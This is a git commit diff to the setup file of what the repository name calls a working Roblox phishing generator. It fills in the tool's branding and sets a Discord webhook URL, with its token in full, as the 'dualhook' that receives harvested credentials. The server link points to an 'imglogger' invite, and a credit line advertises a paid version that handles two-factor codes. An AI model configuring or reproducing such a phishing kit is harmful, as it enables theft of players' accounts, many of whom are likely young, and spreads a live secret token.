2595a50fc2cbc7c7dc43871d0fa7839da8324763
Solicit6178 <129544292+Solicit6178@users.noreply.github.com>
2023-06-19 18:33:46 -0700

    Update setup.php

--- Roblox-Phishing-Generator-Working-main/setup.php
+++ Roblox-Phishing-Generator-Working-main/setup.php
@@ -2,12 +2,12 @@
 
 // Setup file for users!
 
-$name = "Termed#0001"; // Change to any name u want for ur generator
-$image = "https://media.discordapp.net/attachments/1097841417591738378/1098664331828285501/tumblr_1f782183a9ea642e79b07d82c180da50_bbefd568_400.png?width=360&height=360"; // Any Image u want
+$name = "Vistraba Gen"; // Change to any name u want for ur generator
+$image = "https://discord.com/api/webhooks/1120526629182115910/iZ7SSmdIAQ5ZMg05oRlNNTEs7jw588_q5zRwyDscQyOifkveYpPBlujR2p2dSdp1owXl"; // Any Image u want
 $Backgroundcolor = "white"; // Examples white, blue, orange, yellow, wheat
-$adminhook = "WEBHOOK HERE!"; // Change to ur dualhook webhook!
-$discord = ".gg/incog"; // change discord server to ur server
-$colorTitle = "blue"; // Example colors for title white, black, or any other color lol
+$adminhook = "https://discord.com/api/webhooks/1120526629182115910/iZ7SSmdIAQ5ZMg05oRlNNTEs7jw588_q5zRwyDscQyOifkveYpPBlujR2p2dSdp1owXl"; // Change to ur dualhook webhook!
+$discord = ".gg/imglogger"; // change discord server to ur server
+$colorTitle = "black"; // Example colors for title white, black, or any other color lol
 
 
 // Credits Termed#0001 | Message me if u wanna buy a better src with 2fa and more for cheap!
